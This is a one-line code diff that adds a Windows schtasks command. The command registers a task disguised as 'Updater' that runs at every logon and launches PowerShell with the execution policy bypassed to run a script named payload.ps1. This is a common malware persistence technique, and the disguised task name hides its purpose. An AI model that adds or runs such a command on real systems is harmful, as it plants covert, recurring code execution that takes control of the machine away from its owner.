@@ -1,0 +1,1 @@
+schtasks /create /sc onlogon /tn "Updater" /tr "powershell.exe -ExecutionPolicy Bypass -File payload.ps1"
